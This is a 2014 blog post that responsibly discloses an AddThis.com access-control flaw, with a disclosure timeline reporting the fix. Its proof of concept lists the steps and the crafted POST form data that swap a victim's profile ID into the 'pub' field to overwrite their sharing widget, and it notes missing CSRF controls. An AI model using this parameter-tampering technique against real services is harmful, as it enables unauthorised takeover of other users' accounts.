---
layout: post
title:  "Disclosure: How I'm able to take control of any Addthis.com user account!"
date:   2014-10-11 10:04:22
categories: responsible-disclosure
permalink: post/how-im-able-to-take-control-of-any-addthis-com-account/
---

### Description

During publishing this site I've added the Addthis.com plugin (one of the most popular plugin) for sharing content etc.. I'm was surprised when I discovered that I'm able to take complete control of any user account!.

> AddThis is the world's largest content sharing and social insights platform:
>
> 1. Easy-to-use tools help users to share your content and drive viral traffic
> 2. In-depth analytics provide insight into your audience and user activity
> 3. Powerful APIs let you create your own UI, access analytics, and more
> 

### Proof of Concept:

User_X = **ra-5438e922313abc3a** Attacker  
User_Y = **ra-538ce0c960e04da4** Victim  

`ra-XXXXXXXXXXXXXXXX reference to User ProfileId`

1. **User_X** visit the website of **User_Y** that use **Addthis plugin**  
2. **User_X** inspect the page source code and search for profileid string **ra-538ce0c960e04da4** of **User_Y**
3. **User_X login** into his Addthis.com account (**ra-5438e922313abc3a** was assigned to **User_X**)
4. **User_X** make a **POST Request** to:  **<a href="https://www.addthis.com/meta-data/boost-create-widget" title="AddThis - boost-create-widget" target="_blank">https://www.addthis.com/meta-data/boost-create-widget</a>** \\
endpoint with **crafted header**  ([Live HTTP Headers](https://addons.mozilla.org/it/firefox/addon/live-http-headers/ "Live HTTP Headers")) using method `boost-create-widget`
5. **Before User_X make a POST Request**, The **pub property** need to be changed with vulnerable site property value (ex. **(User_X) ra-5438e922313abc3a => (User_Y) ra-538ce0c960e04da4**)

#### Example POST Request Header

{% highlight http %}
Remote Address:208.49.103.220:443
Request URL:https://www.addthis.com/meta-data/boost-create-widget
Request Method:POST
Status Code:200 OK
Request Headersview parsed
POST /meta-data/boost-create-widget HTTP/1.1
Host: www.addthis.com
Connection: keep-alive
Content-Length: 1070
Pragma: no-cache
Cache-Control: no-cache
Accept: */*
[..]
{% endhighlight %}

#### Crafted POST Form Data

{% highlight http %}
pub:ra-538ce0c960e04da4      // (User_X) ra-5438e922313abc3a => (User_Y) ra-538ce0c960e04da4
template:_default
widget[enabled]:true
widget[title]:Follow
widget[size]:large
widget[orientation]:vertical
widget[elements]:.addthis_vertical_follow_toolbox
widget[id]:flwv
widget[services][0][id]:pwned
widget[services][0][service]:facebook
widget[services][0][svc]:facebook
widget[services][0][name]:Facebook
widget[services][0][url]:http://www.facebook.com/pwned
widget[services][1][id]:pwned
widget[services][1][service]:twitter
widget[services][1][svc]:twitter
widget[services][1][name]:Twitter
widget[services][1][url]:http://twitter.com/intent/follow?source=followbutton&variant=1.0&screen_name=pwned
widget[services][2][id]:pwned
widget[services][2][service]:linkedin
widget[services][2][svc]:linkedin
widget[services][2][name]:LinkedIn
widget[services][2][url]:http://www.linkedin.com/in/pwned 
{% endhighlight %}

Now **User_X** receive a `201 response`.  
While in, the **User_Y** website plugin data get updated with **pwned** property value setted by **User_X**.

Note that, a malicious user can perform any request through vulnerable user pub property id value.  
In addition, the website **Addthis.com is devoid largely** of controls **CSRF** for this reason there's no proof of concept, It is really clear..

### Example video scenario using Addthis "/boost-create-widget" method

<div class="photo_frame_center">
	<video width="480" height="360" controls>
		Sorry, your browser doesn't support embedded videos, 
		but don't worry, you can <a href="/video/security/responsible-disclosure/addthis-vulnerability.ogv">Download It</a>
		and watch it with your favorite video player!
		<source src="/video/security/responsible-disclosure/addthis-vulnerability.ogv" type='video/ogg; codecs="theora, vorbis"'>
	</video>
</div>

Watch in <a href="https://www.youtube.com/watch?v=RRkDVY97D88" class="lighter-red" title="How I'm able to take control of any Addthis.com user account!" target="_blank">YouTube</a>

### Disclosure:

* **10/10/2014** – Report to Addthis Support
* **13/10/2014** – Received a response from Addthis Support
* **14/10/2014** – Reply from Addthis that informs me that the bug was fixed
* **14/10/2014** – Public disclosure
